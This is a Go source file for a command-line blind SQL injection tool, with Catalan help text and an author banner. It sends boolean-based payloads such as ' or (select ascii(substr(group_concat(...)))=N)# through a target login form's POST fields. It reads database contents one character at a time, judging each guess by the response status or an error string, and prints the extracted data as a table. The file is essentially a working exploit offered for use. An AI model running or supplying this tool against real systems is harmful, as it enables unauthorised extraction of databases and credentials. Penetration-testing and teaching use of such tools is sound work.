package main

import (
	"fmt"
	"net/http"
  //"net/url"
  "strings"
  "io"
  "os"
  "flag"
  "errors"
  "time"
  
)

const (
  greenColour string ="\033[0;32m\033[1m"
  endColour string ="\033[0m\033[0m"
  redColour string ="\033[0;31m\033[1m"
  blueColour string ="\033[0;34m\033[1m"
  yellowColour string ="\033[0;33m\033[1m"
  purpleColour string ="\033[0;35m\033[1m"
  turquoiseColour string ="\033[0;36m\033[1m"
  grayColour string ="\033[0;37m\033[1m"

)



// func String(name string, value string, usage string) *string



// Variables globals {"username":payload,"password":"test"}
var web_url = flag.String("u","","Url: Url víctima. Ex: http://ip:port")
var query = flag.String("q", "select schema_name from information_schema.schemata","Query: Codi SQL per interactuar amb la base de dades.")
var data_input = flag.String("d","","Data: Data que es tramita per POST al servidor. Ex: usuari=SQLI&contrasenya=test")
var db = flag.String("db","","Database: Base de dades on es farà la consulta.")
var es = flag.String("es","","Error string: Distintiu de la resposta errònia del servidor.")
var sc = flag.Int("sc",0,"Status Code: Codi d'estat que torna el servidor si es fa una petició satisfactòria.")



func url_validate(url string) error{
  var err error
  if url == "" {
    err = errors.New(redColour+"Error: És necessari introduir un URL. Per a més informació utilitzar el paràmetre -h/--help"+endColour)
  }else if ! strings.Contains(url, "http"){
    err = errors.New(redColour+"Error: El format de l'URL és incorrecte. Per a més informació utilitzar el paràmetre -h/--help"+endColour)
  }
  return err
}

func animation(result *string ,slice []string,speed time.Duration){
  for {
    for _,v := range slice {
      *result=v
      time.Sleep(speed*time.Millisecond)
    }
  }
}


func print_table(c chan string) {
  var counter int = 0
  var result, payload string

  //var loading = []string{".","o", "O", "°", "O", "o","."}
  var loading2 = []string{"▁","▃","▄", "▅", "▆", "▇", "█", "▇", "▆", "▅", "▄", "▃","▁"}
  //var loading3 = []string{"┤","┘","┴","├"}
  var loading4 = []string{"⠋","⠙","⠹","⠸","⠼","⠴","⠦","⠧","⠇","⠏"}
  //https://github.com/briandowns/spinner


  var a1 string
  var a2 string
  
  go animation(&a1,loading4,100)
  go animation(&a2,loading2,50)



  for i := range c {
    if counter != 0 {
      //fmt.Printf("\033[2K\033[1A\033[2K\033[1A")
      fmt.Printf("\033[2A\033[J\033[1A\033[J")
      //fmt.Printf("\033[H\n\n\033[J")
      }
    


    if counter % 2 != 0 {
      result+=i   
    } else {
      payload=i
    }
    if len(payload) > 157-12 && counter != 0 {
        fmt.Printf("\033[3A\033[2K\033[1B\033[2K\033[1B\033[2K")
        //payload = payload[:157-12] + "..."
    }
    fmt.Printf(blueColour+"[%v] "+greenColour+"Payload:"+redColour+"%v\n"+blueColour+"[%v] "+greenColour+"Resultats: "+redColour+"%v\n\n"+endColour,a1,payload,a2,result)
    counter++
  }
  
  if result != "" {

    splited_output := strings.Split(result,",")
    var max_length int
    for _,v := range splited_output {
      if max_length < len(v) {
        max_length = len(v)
      }
    }
    var result_final string = blueColour+"+"+strings.Repeat("-",max_length+2)+"+\n| "+endColour
    max_length+=2
    counter=0
    for _,v := range result {
      if v != ',' {
        result_final+=fmt.Sprintf(purpleColour+"%c"+endColour, v)
        counter+=1
      }else {
        if counter != max_length {
          result_final+=strings.Repeat(" ",max_length-counter-1)
        }
      result_final+=(blueColour+"|\n+"+strings.Repeat("-",max_length)+"+\n| "+endColour)
      counter=0
      }
    }
    
    fmt.Println(result_final+blueColour+strings.Repeat(" ",max_length-counter-1)+"|\n+"+strings.Repeat("-",max_length)+"+"+endColour)
  }
}


func validate_responce(respbody []byte, respstatuscode int, sc int, es string) bool {
  // resp.StatusCode == 200 && ! strings.Contains(string(body),"Login Error. Please try again.") 
  
  if sc == 0 && es == "" {
    fmt.Println(redColour+"Error: És necessari introduir com a mínim un dels dos paràmetres -ec i -es. Per a més informació utilitzar el paràmetre -h/--help"+endColour)
    os.Exit(1)
  }
    
  if sc == respstatuscode && !strings.Contains(string(respbody),es) {
    return true
  } else if !strings.Contains(string(respbody),es) {
    return true
  } else {
    return false
  }

}








/*
var data = url.Values{"username": {"test"}, "password": {"test"}}
var sustitude string = "username"
var selectsql string = "schema_name"
var fromsql string = " from information_schema.schemata"
*/


func makeSQLI(data *Data_struct,query *QuerySQL, web_url string, c chan<- string) {
  for position:=1 ; position>0 ; position++ {
    for character:=25; character<=125; character++ {
      var payload string = fmt.Sprintf("' or (select(select ascii(substr(group_concat(%v),%v,1))%v %v)=%v)#", query.selectsql,position,query.fromsql,query.extrasql,character)
      
      data.payload_load(payload)
	    resp, err := http.PostForm(web_url, data.value)

	    if err != nil {
		    fmt.Printf(redColour+"Error: Hi ha hagut un problema amb la connexió amb el servidor. Per a més informació utilitzar el paràmetre -h/--help"+endColour)
        os.Exit(1)
	    }

      defer resp.Body.Close()
      body, err := io.ReadAll(resp.Body)
      if err != nil {
        fmt.Printf(redColour+"Error: Hi ha hagut un problema llegint la resposta del servidor. Per a més informació utilitzar el paràmetre -h/--help"+endColour)
        os.Exit(1)
      }
        c <- payload
      if validate_responce(body,resp.StatusCode,*sc,*es) {
        //fmt.Printf("%c",character)
        c <- fmt.Sprintf("%c",character)
        break
        
      } else if character == 125 {
          close(c)
      } else {
        c <- ""
      }
     defer resp.Body.Close() 
    }
  }
  
}

func main() {
  fmt.Println(redColour+`
   _____ ____    __       ____        _           __  _           
  / ___// __ \  / /      /  _/___    (_)__  _____/ /_(_)___  ____ 
  \__ \/ / / / / /       / // __ \  / / _ \/ ___/ __/ / __ \/ __ \
 ___/ / /_/ / / /___   _/ // / / / / /  __/ /__/ /_/ / /_/ / / / /
/____/\___\_\/_____/  /___/_/ /_/_/ /\___/\___/\__/_/\____/_/ /_/ 
                               /___/                              
Bruno Ríos Castelló                                         
`+"\n"+endColour)

  flag.Parse()
  if err := url_validate(*web_url); err != nil {
    fmt.Println(err)
    os.Exit(1)
  }



  data, err := DataInit(*data_input)
  if err != nil {
    fmt.Printf(redColour+"%v\n"+endColour,err)
    os.Exit(1)
  }

  query, err := QueryInit(*query,*db)
  if err != nil {
	fmt.Printf(redColour+"%v\n"+endColour,err)
	os.Exit(1)
	}
  
  var c = make(chan string, 2)
  go makeSQLI(data, query, *web_url, c)

  print_table(c)
  
}
